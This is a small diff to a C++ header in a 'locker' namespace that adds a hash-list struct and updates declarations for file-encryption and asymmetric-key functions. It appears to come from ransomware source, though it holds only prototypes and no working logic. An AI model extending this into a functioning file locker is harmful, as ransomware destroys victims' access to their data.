@@ -19,12 +19,18 @@ namespace locker
 		DWORD bit;
 	}FILE_INFO, * PFILE_INFO;
 	
+	typedef struct HashList
+	{
+		BYTE* hash;
+		SLIST_ENTRY(HashList);
+	} *PHLIST, HLIST;
 
-	BOOL HandlerCrypt(WCHAR* Filename, WCHAR* FPAth, WCHAR* Path, WCHAR* Exs);
+
+	
+	BOOL HandlerCrypt(WCHAR* Filename, WCHAR* FPAth, WCHAR* Path, WCHAR* Exs, SLIST<HLIST>* HashList);
 	BOOL HandlerASymmetricGenKey();
+	BOOL VerifyContent(SLIST<locker::HLIST>* list);
 }
-
-
 
 
 
